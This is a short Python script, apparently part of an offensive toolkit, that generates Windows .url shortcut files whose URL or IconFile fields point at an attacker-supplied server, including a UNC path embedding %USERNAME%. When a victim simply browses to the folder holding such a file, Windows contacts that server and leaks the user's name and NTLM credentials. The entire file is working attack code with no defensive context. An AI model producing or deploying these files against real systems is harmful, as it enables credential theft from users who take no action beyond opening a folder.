#!/usr/bin/env python
# -*- coding: utf-8 -*-


def create_url_url(generate, server, filename):
    file = open(filename, "w")
    file.write(
        """[InternetShortcut]
URL=file://"""
        + server
        + """/leak/leak.html"""
    )
    file.close()
    print("Created: " + filename + " (BROWSE TO FOLDER)")


def create_url_icon(generate, server, filename):
    file = open(filename, "w")
    file.write(
        """[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\\\"""
        + server
        + """\\%USERNAME%.icon
IconIndex=1"""
    )
    file.close()
    print("Created: " + filename + " (BROWSE TO FOLDER)")
